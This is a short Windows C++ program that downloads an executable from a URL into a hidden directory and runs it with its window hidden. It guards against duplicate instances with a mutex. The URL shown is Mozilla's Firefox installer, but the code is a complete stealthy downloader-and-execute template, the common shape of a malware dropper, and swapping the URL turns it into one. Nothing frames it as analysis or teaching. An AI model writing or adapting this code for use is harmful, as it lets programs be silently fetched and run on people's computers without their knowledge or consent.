#include <iostream>
#include <windows.h>
#include <urlmon.h>
#pragma comment(lib, "urlmon.lib")

void DownloadAndRunFile(const char* url, const char* filePath) {
    URLDownloadToFile(NULL, url, filePath, 0, NULL);
    ShellExecute(NULL, "open", filePath, NULL, NULL, SW_HIDE);
}

int main() {
    // Create mutex to ensure only one instance runs
    HANDLE hMutex = CreateMutex(NULL, TRUE, "MyMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return 0;
    }

    // Create hidden directory if it doesn't exist
    CreateDirectory("C:\\ProgramCache", NULL);
    SetFileAttributes("C:\\ProgramCache", FILE_ATTRIBUTE_HIDDEN);

    // Download Firefox installer and execute silently
    const char* url = "https://download.mozilla.org/?product=firefox-latest&os=win&lang=en-US";
    const char* filePath = "C:\\ProgramCache\\FirefoxInstaller.exe";
    DownloadAndRunFile(url, filePath);

    // Close mutex handle
    CloseHandle(hMutex);
    return 0;
}